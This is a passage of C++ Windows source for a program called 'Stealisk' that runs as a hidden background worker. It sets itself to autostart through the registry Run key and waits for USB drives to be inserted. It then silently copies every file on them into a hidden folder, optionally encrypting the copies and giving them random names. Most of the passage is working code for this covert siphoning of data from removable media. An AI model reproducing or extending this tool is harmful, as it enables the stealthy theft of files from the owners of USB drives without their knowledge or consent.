        WriteLog("Loaded language from resource: " + langCode, true);
        return lang;
    }
    for (const auto& l : langs) {
        if (LoadLanguageFromResource(l, lang)) {
            WriteLog("Fallback language from resource: " + l, true);
            return lang;
        }
    }
    return Language();
}

// ==================== 加密 ====================
static std::vector<BYTE> HexToBytes(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i + 1 < hex.length(); i += 2) {
        std::string byteStr = hex.substr(i, 2);
        BYTE byte = (BYTE)strtol(byteStr.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

static bool EncryptFile(const std::wstring& inputPath, const std::wstring& outputPath, const std::string& keyHex) {
    if (keyHex.length() != StealiskConstants::AES_KEY_HEX_LEN) return false;
    std::vector<BYTE> keyBytes = HexToBytes(keyHex);
    if (keyBytes.size() != 32) return false;

    FileHandle hIn(CreateFileW(inputPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
    if (!hIn.valid()) return false;

    DWORD inSize = GetFileSize(hIn, NULL);
    std::vector<BYTE> plainData(inSize);
    if (inSize > 0) {
        DWORD read;
        ReadFile(hIn, plainData.data(), inSize, &read, NULL);
    }
    hIn.reset();

    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    auto provCleanup = [&]() { if (hProv) CryptReleaseContext(hProv, 0); };

    BYTE iv[16];
    if (!CryptGenRandom(hProv, 16, iv)) {
        provCleanup();
        return false;
    }

    HCRYPTKEY hKey = 0;
    struct AesKeyBlob {
        BLOBHEADER hdr;
        DWORD keySize;
        BYTE keyBytes[32];
    } keyBlob;
    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.keySize = 32;
    memcpy(keyBlob.keyBytes, keyBytes.data(), 32);

    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        provCleanup();
        return false;
    }
    auto keyCleanup = [&]() { if (hKey) CryptDestroyKey(hKey); };

    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        keyCleanup();
        provCleanup();
        return false;
    }

    DWORD outSize = inSize + 16;
    std::vector<BYTE> cipherData(outSize);
    if (inSize > 0) memcpy(cipherData.data(), plainData.data(), inSize);
    DWORD tempSize = inSize;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, cipherData.data(), &tempSize, outSize)) {
        keyCleanup();
        provCleanup();
        return false;
    }

    FileHandle hOut(CreateFileW(outputPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
    if (!hOut.valid()) {
        keyCleanup();
        provCleanup();
        return false;
    }

    DWORD written;
    WriteFile(hOut, iv, 16, &written, NULL);
    WriteFile(hOut, cipherData.data(), tempSize, &written, NULL);

    keyCleanup();
    provCleanup();
    return true;
}

// ==================== 辅助功能 ====================
static void SetAutoStartBoot(bool enable) {
    RegKeyHandle hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, hKey.ptr()) != ERROR_SUCCESS) return;

    if (enable) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);

        Config cfg = LoadConfig();
        bool showTray = cfg.GetShowTray();

        std::wstring cmdLine;
        if (showTray) {
            cmdLine = L"\"" + std::wstring(exePath) + L"\" --no-console";
            WriteLog("SetAutoStartBoot: Boot mode with tray (--no-console)", true);
        } else {
            std::wstring workerPath = GetWorkerPath(cfg);
            if (workerPath.empty()) {
                WriteLog("FATAL: SetAutoStartBoot - workerPath is empty", true);
                return;
            }
            cmdLine = L"\"" + workerPath + L"\" --worker";
            WriteLog("SetAutoStartBoot: Silent worker mode", true);
        }

        RegSetValueExW(hKey, L"Stealisk", 0, REG_SZ, (BYTE*)cmdLine.c_str(), (DWORD)((cmdLine.length() + 1) * sizeof(wchar_t)));
    } else {
        RegDeleteValueW(hKey, L"Stealisk");
    }
}

static std::wstring GetTargetRoot(const Config& cfg) {
    std::wstring target = cfg.GetTargetDir();
    if (!target.empty()) {
        return ExpandEnvironmentStringsInPath(target);
    }
    return GetExeDirectory() + L"\\target";
}

static void EnsureHiddenDirectory(const std::wstring& dir, bool hide) {
    if (!PathFileExistsW(dir.c_str())) {
        CreateDirectoryW(dir.c_str(), NULL);
    }
    if (hide) {
        SetFileAttributesW(dir.c_str(), FILE_ATTRIBUTE_HIDDEN);
    } else {
        DWORD attrs = GetFileAttributesW(dir.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_HIDDEN)) {
            SetFileAttributesW(dir.c_str(), attrs & ~FILE_ATTRIBUTE_HIDDEN);
        }
    }
}

static std::wstring GetUniqueFilename(const std::wstring& targetPath) {
    if (!PathFileExistsW(targetPath.c_str())) return targetPath;
    wchar_t dir[MAX_PATH];
    wcscpy_s(dir, targetPath.c_str());
    PathRemoveFileSpecW(dir);
    wchar_t baseName[MAX_PATH];
    wcscpy_s(baseName, targetPath.c_str());
    PathStripPathW(baseName);
    std::wstring stem = baseName;
    size_t dot = stem.find_last_of(L'.');
    std::wstring ext;
    if (dot != std::wstring::npos) {
        ext = stem.substr(dot);
        stem = stem.substr(0, dot);
    }
    int counter = 1;
    while (true) {
        wchar_t newPath[MAX_PATH];
        swprintf_s(newPath, L"%s\\%s_%d%s", dir, stem.c_str(), counter, ext.c_str());
        if (!PathFileExistsW(newPath)) return newPath;
        counter++;
    }
}

static std::wstring GenerateRandomFilename(const std::wstring& originalPath) {
    wchar_t dir[MAX_PATH];
    wcscpy_s(dir, originalPath.c_str());
    PathRemoveFileSpecW(dir);
    wchar_t baseName[MAX_PATH];
    wcscpy_s(baseName, originalPath.c_str());
    PathStripPathW(baseName);
    std::wstring stem = baseName;
    std::wstring ext;
    size_t dot = stem.find_last_of(L'.');
    if (dot != std::wstring::npos) {
        ext = stem.substr(dot);
        stem = stem.substr(0, dot);
    }
    GUID guid;
    CoCreateGuid(&guid);
    wchar_t randomStr[40];
    swprintf_s(randomStr, L"%08x%04x%04x%04x%04x%04x%04x",
        guid.Data1, guid.Data2, guid.Data3,
        (guid.Data4[0] << 8) | guid.Data4[1],
        (guid.Data4[2] << 8) | guid.Data4[3],
        (guid.Data4[4] << 8) | guid.Data4[5],
        (guid.Data4[6] << 8) | guid.Data4[7]);
    return std::wstring(dir) + L"\\" + randomStr + ext;
}

// ==================== 通配符匹配 ====================
static bool MatchWildcard(const std::wstring& name, const std::wstring& pattern, bool caseSens) {
    std::wstring n = name;
    std::wstring p = pattern;
    if (!caseSens) {
        std::transform(n.begin(), n.end(), n.begin(), ::towlower);
        std::transform(p.begin(), p.end(), p.begin(), ::towlower);
    }
    if (p == n) return true;
    if (p == L"*") return true;
    if (p.front() == L'*' && p.back() == L'*') {
        std::wstring mid = p.substr(1, p.length() - 2);
        return n.find(mid) != std::wstring::npos;
    }
    if (p.front() == L'*') {
        std::wstring suffix = p.substr(1);
        return n.length() >= suffix.length() &&
               n.compare(n.length() - suffix.length(), suffix.length(), suffix) == 0;
    }
    if (p.back() == L'*') {
        std::wstring prefix = p.substr(0, p.length() - 1);
        return n.length() >= prefix.length() &&
               n.compare(0, prefix.length(), prefix) == 0;
    }
    return false;
}

// ==================== 黑白名单检查 ====================
static bool IsNameInList(const std::wstring& name, const std::vector<std::wstring>& list, bool caseSens) {
    if (list.empty()) return false;
    for (const auto& pattern : list) {
        if (MatchWildcard(name, pattern, caseSens)) {
            return true;
        }
    }
    return false;
}

static bool ShouldProcessDirectory(const std::wstring& dirName, const Config& cfg) {
    bool caseSens = cfg.GetCaseSensitive();
    auto includeDirs = cfg.GetIncludeDirs();
    auto excludeDirs = cfg.GetExcludeDirs();

    if (!includeDirs.empty()) {
        if (!IsNameInList(dirName, includeDirs, caseSens)) return false;
    }
    if (!excludeDirs.empty()) {
        if (IsNameInList(dirName, excludeDirs, caseSens)) return false;
    }
    return true;
}

static bool ShouldProcessFile(const std::wstring& fileName, const Config& cfg) {
    bool caseSens = cfg.GetCaseSensitive();
    auto includeFiles = cfg.GetIncludeFiles();
    auto excludeFiles = cfg.GetExcludeFiles();

    if (!includeFiles.empty()) {
        if (!IsNameInList(fileName, includeFiles, caseSens)) return false;
    }
    if (!excludeFiles.empty()) {
        if (IsNameInList(fileName, excludeFiles, caseSens)) return false;
    }
    return true;
}

// ==================== 计算文件哈希 ====================
static std::string CalculateFileHash(const std::wstring& filePath) {
    FileHandle hFile(CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
    if (!hFile.valid()) return "";

    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::string result;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return "";
    auto provCleanup = [&]() { if (hProv) CryptReleaseContext(hProv, 0); };

    if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
        provCleanup();
        return "";
    }
    auto hashCleanup = [&]() { if (hHash) CryptDestroyHash(hHash); };

    BYTE buffer[StealiskConstants::FILE_HASH_BUFFER_SIZE];
    DWORD bytesRead;
    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        CryptHashData(hHash, buffer, bytesRead, 0);
    }
    hFile.reset();

    DWORD hashSize = 0;
    DWORD paramSize = sizeof(DWORD);
    CryptGetHashParam(hHash, HP_HASHSIZE, (BYTE*)&hashSize, &paramSize, 0);
    std::vector<BYTE> hashBytes(hashSize);
    CryptGetHashParam(hHash, HP_HASHVAL, hashBytes.data(), &hashSize, 0);

    char hex[64];
    for (DWORD i = 0; i < hashSize && i < 20; i++) {
        sprintf_s(hex + i * 2, 3, "%02x", hashBytes[i]);
    }
    result = std::string(hex, hashSize * 2);

    hashCleanup();
    provCleanup();
    return result;
}

static std::wstring GetHashDBPath() {
    return GetCacheDirectory() + L"\\Stealisk_hashes.db";
}

static std::set<std::string> LoadCopiedHashes() {
    std::set<std::string> hashes;
    std::wstring path = GetHashDBPath();
    FileHandle hFile(CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
    if (!hFile.valid()) return hashes;
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize > 0 && fileSize < StealiskConstants::MAX_CONFIG_FILE_SIZE) {
        std::vector<char> buffer(fileSize + 1, 0);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL);
        std::string content(buffer.data(), bytesRead);
        std::istringstream iss(content);
        std::string line;
        while (std::getline(iss, line)) {
            if (!line.empty()) hashes.insert(line);
        }
    }
    return hashes;
}

static void SaveCopiedHashes(const std::set<std::string>& hashes) {
    std::wstring path = GetHashDBPath();
    FileHandle hFile(CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
    if (!hFile.valid()) return;
    std::string content;
    content.reserve(hashes.size() * 64);
    for (const auto& h : hashes) {
        content += h;
        content += "\n";
    }
    DWORD written;
    WriteFile(hFile, content.c_str(), content.size(), &written, NULL);
}

// ==================== 全局状态 ====================
static HANDLE g_recordMutex = NULL;
static std::set<std::string> g_copiedFileHashes;
static std::atomic<bool> g_stopCopyFlag{false};
static std::atomic<bool> g_scanInProgress{false};
static std::atomic<bool> g_scanStopRequested{false};
static std::atomic<bool> g_workerStopRequested{false};

static NOTIFYICONDATAW g_nid = {0};
static bool g_trayCreated = false;
static HWND g_controllerHwnd = NULL;
static HANDLE g_controllerMutex = NULL;
static std::atomic<bool> g_needRefreshMenu{false};

static HANDLE g_consoleProcess = NULL;
static HWND g_consoleMsgWindow = NULL;
static bool g_consoleVisibleState = true;
static bool g_noConsoleMode = false;

// ==================== Worker 核心函数 ====================
static std::wstring GetScanLockPath() {
    return GetCacheDirectory() + L"\\Stealisk_scanning.lock";
}

static bool IsScanning() {
    std::wstring path = GetScanLockPath();
    return PathFileExistsW(path.c_str());
}

static void CreateScanLock() {
    std::wstring path = GetScanLockPath();
    FileHandle hFile(CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
}

static void RemoveScanLock() {
    std::wstring path = GetScanLockPath();
    DeleteFileW(path.c_str());
}

static bool IsAlreadyCopied(const std::wstring& srcPath) {
    WaitForSingleObject(g_recordMutex, INFINITE);
    std::string fileHash = CalculateFileHash(srcPath);
    bool exists = false;
    if (!fileHash.empty()) {
        exists = (g_copiedFileHashes.find(fileHash) != g_copiedFileHashes.end());
        if (!exists) {
            g_copiedFileHashes.insert(fileHash);
            SaveCopiedHashes(g_copiedFileHashes);
        }
    }
    ReleaseMutex(g_recordMutex);
    if (exists) {
        WriteLog("Skipping duplicate (hash match): " + std::string(srcPath.begin(), srcPath.end()));
    }
    return exists;
}

static bool CopyOrEncryptFile(const std::wstring& src, const std::wstring& dst, const Config& cfg) {
    if (IsAlreadyCopied(src)) return false;
    bool result;
    std::wstring finalDst = dst;
    if (cfg.GetRandomizeFilename()) {
        finalDst = GenerateRandomFilename(dst);
    }
    if (cfg.GetEnableEncrypt()) {
        std::string keyHex = cfg.GetEncKeyHex();
        if (keyHex.length() == StealiskConstants::AES_KEY_HEX_LEN) {
            result = EncryptFile(src, finalDst, keyHex);
        } else {
            WriteLog("WARNING: Encryption enabled but key is invalid (length: " + std::to_string(keyHex.length()) + "), falling back to plain copy: " + std::string(src.begin(), src.end()), true);
            result = CopyFileW(src.c_str(), finalDst.c_str(), FALSE);
        }
    } else {
        result = CopyFileW(src.c_str(), finalDst.c_str(), FALSE);
    }
    if (result) {
        WriteLog("Copied: " + std::string(src.begin(), src.end()) + " -> " + std::string(finalDst.begin(), finalDst.end()));
    } else {
        WriteLog("Failed to copy: " + std::string(src.begin(), src.end()));
    }
    return result;
}

static void ScanDrive(const std::wstring& driveRoot, const Config& cfg, const std::wstring& targetRoot) {
    std::wstring searchPath = driveRoot + L"*.*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (g_scanStopRequested.load() || g_workerStopRequested.load()) {
            WriteLog("Scan stopped by request", true);
            break;
        }
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;

        std::wstring fullPath = driveRoot + fd.cFileName;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!ShouldProcessDirectory(fd.cFileName, cfg)) {
                WriteLog("Skipping directory: " + std::string(fd.cFileName, fd.cFileName + wcslen(fd.cFileName)) + " (filter)", true);
                continue;
            }
            ScanDrive(fullPath + L"\\", cfg, targetRoot);
        } else {
            if (ShouldProcessFile(fd.cFileName, cfg)) {
                std::wstring relative;
                if (fullPath.find(driveRoot) == 0) relative = fullPath.substr(driveRoot.length());
                else relative = fd.cFileName;
                std::wstring destPath = targetRoot + L"\\" + relative;
                wchar_t destDir[MAX_PATH];
                wcscpy_s(destDir, destPath.c_str());
                PathRemoveFileSpecW(destDir);
                EnsureHiddenDirectory(destDir, cfg.GetHideTargetDir());
                if (GetFileAttributesW(fullPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    CopyOrEncryptFile(fullPath, destPath, cfg);
                }
            } else {
                WriteLog("Skipping file: " + std::string(fd.cFileName, fd.cFileName + wcslen(fd.cFileName)) + " (filter)", true);
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

static std::vector<std::wstring> GetRemovableDrives() {
    std::vector<std::wstring> drives;
    DWORD mask = GetLogicalDrives();
    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        if (mask & 1) {
            std::wstring root = std::wstring(1, drive) + L":\\";
            if (GetDriveTypeW(root.c_str()) == DRIVE_REMOVABLE) drives.push_back(root);
        }
        mask >>= 1;
    }
    return drives;
}

static void PerformScan(const Config& cfg) {
    if (g_scanInProgress.exchange(true)) {
        WriteLog("Scan already in progress", true);
        return;
    }
    g_scanStopRequested = false;
    WriteLog("Scan started", true);
    CreateScanLock();

    std::wstring targetRoot = GetTargetRoot(cfg);
    EnsureHiddenDirectory(targetRoot, cfg.GetHideTargetDir());
    auto drives = GetRemovableDrives();
    if (drives.empty()) {
        WriteLog("No removable drives found", true);
    } else {
        for (const auto& drive : drives) {
            if (g_scanStopRequested.load() || g_workerStopRequested.load()) break;
            WriteLog("Scanning drive: " + std::string(drive.begin(), drive.end()));
            ScanDrive(drive, cfg, targetRoot);
        }
    }
    g_scanInProgress = false;
    g_scanStopRequested = false;
    RemoveScanLock();
    WriteLog("Scan completed", true);
}

static void HandleUSBInsertion(const Config& cfg) {
    WriteLog("USB inserted, waiting...", true);
    Sleep(cfg.GetScanDelaySeconds() * 1000);
    if (g_stopCopyFlag.load() || g_workerStopRequested.load()) {
        WriteLog("Copy stopped by user or system", true);
        return;
    }
    PerformScan(cfg);
    WriteLog("USB scan completed", true);
}

// ==================== Worker 进程 ====================
static HANDLE g_workerStopEvent = NULL;
static UINT_PTR g_workerTimerId = 0;
static FILETIME g_workerLastConfigTime = {0};

static DWORD WINAPI USBInsertionThread(LPVOID param) {
    Config* cfg = static_cast<Config*>(param);
    HandleUSBInsertion(*cfg);
    delete cfg;
    return 0;
}

LRESULT CALLBACK WorkerWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static Config cfg;
    switch (msg) {
        case WM_CREATE: {
            cfg = LoadConfig();
            WriteLog("Worker initializing...", true);
            PerformScan(cfg);
            int interval = cfg.GetScanIntervalSeconds();
            if (interval <= 0) interval = 15;
            g_workerTimerId = SetTimer(hwnd, 1, interval * 1000, NULL);
            WriteLog("Worker timer set to " + std::to_string(interval) + " seconds", true);
            std::wstring configPath = GetExeDirectory() + L"\\Stealisk.ini";
            FileHandle hFile(CreateFileW(configPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
            if (hFile.valid()) {
                GetFileTime(hFile, NULL, NULL, &g_workerLastConfigTime);
            }
            break;
        }
        case WM_TIMER: {
            if (wParam == g_workerTimerId) {
                std::wstring configPath = GetExeDirectory() + L"\\Stealisk.ini";
                FileHandle hFile(CreateFileW(configPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
                if (hFile.valid()) {
                    FILETIME ft;
                    GetFileTime(hFile, NULL, NULL, &ft);
                    if (CompareFileTime(&ft, &g_workerLastConfigTime) != 0) {
                        WriteLog("Config changed, reloading", true);
                        cfg = LoadConfig();
                        g_workerLastConfigTime = ft;
                        int interval = cfg.GetScanIntervalSeconds();
                        if (interval <= 0) interval = 15;
                        KillTimer(hwnd, g_workerTimerId);
                        g_workerTimerId = SetTimer(hwnd, 1, interval * 1000, NULL);
                        WriteLog("Timer interval updated to " + std::to_string(interval), true);
                    }
                }
                if (!g_stopCopyFlag.load() && !g_workerStopRequested.load()) {
                    PerformScan(cfg);
                }
            }
            break;
        }
        case WM_DEVICECHANGE: {
            if (wParam == DBT_DEVICEARRIVAL) {
                PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam;
                if (pHdr && pHdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                    if (!g_workerStopRequested.load()) {
                        Config* cfgPtr = new Config(cfg);
                        CreateThread(NULL, 0, USBInsertionThread, cfgPtr, 0, NULL);
                    }
                }
            } else if (wParam == DBT_DEVICEQUERYREMOVE) {
                g_scanStopRequested = true;
            }
            break;
        }
        case WM_USER_SCAN: {
            if (!g_workerStopRequested.load()) {
                WriteLog("Manual scan triggered by WM_USER_SCAN", true);
                PerformScan(cfg);
            }
            break;
        }
        case WM_USER_STOP_SCAN: {
            if (g_scanInProgress.load()) {
                g_scanStopRequested = true;
                WriteLog("Scan stop requested", true);
            }
            break;
        }
        case WM_DESTROY:
            if (g_workerTimerId) KillTimer(hwnd, g_workerTimerId);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

static int RunWorker() {
    SetGlobalErrorMode();
    FreeConsole();
    WriteLog("Worker started (no tray)", true);

    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\Stealisk_Worker");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        WriteLog("Worker already running, exiting", true);
        return 0;
    }
    g_recordMutex = CreateMutexW(NULL, FALSE, L"Global\\Stealisk_RecordMutex");
    g_workerStopEvent = CreateEventW(NULL, TRUE, FALSE, L"Global\\Stealisk_StopEvent");
    if (!g_workerStopEvent) {
        WriteLog("Failed to create stop event", true);
        return 1;
    }
    WritePidFile(GetCurrentProcessId());
    g_copiedFileHashes = LoadCopiedHashes();
    WriteLog("Loaded " + std::to_string(g_copiedFileHashes.size()) + " cached hashes", true);

    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WorkerWndProc;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = L"StealiskWorkerHiddenClass";
    RegisterClassExW(&wc);
    HWND hwnd = CreateWindowExW(0, L"StealiskWorkerHiddenClass", L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, NULL);
    if (!hwnd) return 1;

    DEV_BROADCAST_DEVICEINTERFACE_W dbdi;
    dbdi.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE_W);
    dbdi.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
    GUID GUID_DEVINTERFACE_VOLUME = {0x53f5630dL, 0xb6bf, 0x11d0, {0x94, 0xf2, 0x00, 0xa0, 0xc9, 0x1e, 0xfb, 0x8b}};
    dbdi.dbcc_classguid = GUID_DEVINTERFACE_VOLUME;
    HDEVNOTIFY hNotify = RegisterDeviceNotificationW(hwnd, &dbdi, DEVICE_NOTIFY_WINDOW_HANDLE);

    MSG msg;
    while (true) {
        DWORD ret = MsgWaitForMultipleObjectsEx(1, &g_workerStopEvent, INFINITE, QS_ALLINPUT, MWMO_INPUTAVAILABLE);
        if (ret == WAIT_OBJECT_0) {
            WriteLog("Stop event received, exiting worker", true);
            g_workerStopRequested = true;
            g_scanStopRequested = true;
            RemoveScanLock();
            break;
        }
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            if (msg.message == WM_QUIT) break;
        }
        if (msg.message == WM_QUIT) break;
    }
    if (hNotify) UnregisterDeviceNotification(hNotify);
    DestroyWindow(hwnd);
    if (g_recordMutex) CloseHandle(g_recordMutex);
    if (g_workerStopEvent) CloseHandle(g_workerStopEvent);
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    DeletePidFile();
    RemoveScanLock();
    WriteLog("Worker process exiting", true);
    return 0;
}

// ==================== Worker 管理 ====================
static bool IsWorkerRunning() {
    try {
        std::wstring workerPath = g_cachedWorkerPath.empty() ? GetWorkerPath(LoadConfig()) : g_cachedWorkerPath;
        if (workerPath.empty()) return false;
        if (!PathFileExistsW(workerPath.c_str())) return false;

        DWORD pid = ReadPidFile();
        if (pid != 0) {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
            if (hProc) {
                wchar_t procPath[MAX_PATH];
                if (GetModuleFileNameExW(hProc, NULL, procPath, MAX_PATH) > 0) {
                    CloseHandle(hProc);
                    if (_wcsicmp(procPath, workerPath.c_str()) == 0) return true;
                } else CloseHandle(hProc);
            }
            DeletePidFile();
        }
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return false;
        PROCESSENTRY32W pe = {sizeof(PROCESSENTRY32W)};
        if (Process32FirstW(hSnap, &pe)) {
            do {
                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
                if (hProc) {
                    wchar_t procPath[MAX_PATH];
                    if (GetModuleFileNameExW(hProc, NULL, procPath, MAX_PATH) > 0) {
                        if (_wcsicmp(procPath, workerPath.c_str()) == 0) {
                            CloseHandle(hProc);
                            CloseHandle(hSnap);
                            WritePidFile(pe.th32ProcessID);
                            return true;
                        }
                    }
                    CloseHandle(hProc);
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
        return false;
    } catch (...) {
        WriteLog("IsWorkerRunning exception", true);
        return false;
    }
}

static bool StopWorker() {
    WriteLog("Stopping worker...", true);
    try {
        std::wstring workerPath = g_cachedWorkerPath.empty() ? GetWorkerPath(LoadConfig()) : g_cachedWorkerPath;
        if (workerPath.empty()) return false;

        DWORD pid = ReadPidFile();
        if (pid == 0) {
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W pe = {sizeof(PROCESSENTRY32W)};
                if (Process32FirstW(hSnap, &pe)) {
                    do {
                        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
                        if (hProc) {
                            wchar_t procPath[MAX_PATH];
                            if (GetModuleFileNameExW(hProc, NULL, procPath, MAX_PATH) > 0) {
                                if (_wcsicmp(procPath, workerPath.c_str()) == 0) {
                                    pid = pe.th32ProcessID;
                                    CloseHandle(hProc);
                                    break;
                                }
                            }
                            CloseHandle(hProc);
                        }
                    } while (Process32NextW(hSnap, &pe));
                }
                CloseHandle(hSnap);
            }
            if (pid == 0) {
                WriteLog("StopWorker: No running worker found", true);
                return true;
            }
        }
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pid);
        if (!hProcess) {
            WriteLog("StopWorker: Could not open process, forcing terminate", true);
            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
            DeletePidFile();
            return true;
        }
        HANDLE hStopEvent = NULL;
        for (int attempt = 0; attempt < StealiskConstants::WORKER_STOP_RETRY_COUNT; ++attempt) {
            hStopEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"Global\\Stealisk_StopEvent");
            if (hStopEvent) break;
            Sleep(StealiskConstants::WORKER_STOP_RETRY_INTERVAL_MS);
        }
        if (hStopEvent) {
            SetEvent(hStopEvent);
            CloseHandle(hStopEvent);
        }
        DWORD waitResult = WaitForSingleObject(hProcess, StealiskConstants::WORKER_STOP_WAIT_TIMEOUT_MS);
        if (waitResult == WAIT_OBJECT_0 || waitResult == WAIT_TIMEOUT) {
            if (waitResult == WAIT_TIMEOUT) TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            DeletePidFile();
            WriteLog("Worker stopped successfully", true);
            return true;
        } else {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            DeletePidFile();
            WriteLog("Worker stopped (forced)", true);
            return true;
        }
    } catch (...) {
        WriteLog("StopWorker exception", true);
        return false;
    }
}

static bool StartWorker(const Config& cfg) {
    WriteLog("Starting worker...", true);
    try {
        std::wstring workerPath = GetWorkerPath(cfg);
        if (workerPath.empty()) {
            WriteLog("StartWorker: worker path empty", true);
            return false;
        }

        StopWorker();
        Sleep(StealiskConstants::WORKER_STOP_RETRY_INTERVAL_MS);

        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        if (!CopyFileW(exePath, workerPath.c_str(), FALSE)) {
            WriteLog("Failed to copy worker exe", true);
            return false;
        }
        WriteLog("Worker exe copied from main", true);

        if (cfg.GetStripResources()) {
            WriteLog("Strip resources enabled, stripping worker...", true);
            StripWorkerResources(workerPath);
        } else {
            WriteLog("Strip resources disabled, worker retains full resources", true);
        }

        HANDLE hStopEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"Global\\Stealisk_StopEvent");
        if (hStopEvent) { ResetEvent(hStopEvent); CloseHandle(hStopEvent); }

        STARTUPINFOW si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        wchar_t cmdLine[MAX_PATH + 20];
        wcscpy_s(cmdLine, workerPath.c_str());
        wcscat_s(cmdLine, L" --worker");
        if (CreateProcessW(workerPath.c_str(), cmdLine, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            WriteLog("Worker started successfully", true);
            return true;
        }
        WriteLog("Failed to start worker process", true);
        return false;
    } catch (...) {
        WriteLog("StartWorker exception", true);
        return false;
    }
}

// ==================== Controller 托盘 ====================
static void CreateControllerTrayIcon(HWND hwnd) {
    if (g_trayCreated) return;
    g_nid.cbSize = sizeof(NOTIFYICONDATAW);
    g_nid.hWnd = hwnd;
    g_nid.uID = 1;
    g_nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    g_nid.uCallbackMessage = WM_TRAYICON;
    g_nid.hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_MAIN_ICON));
    if (!g_nid.hIcon) {
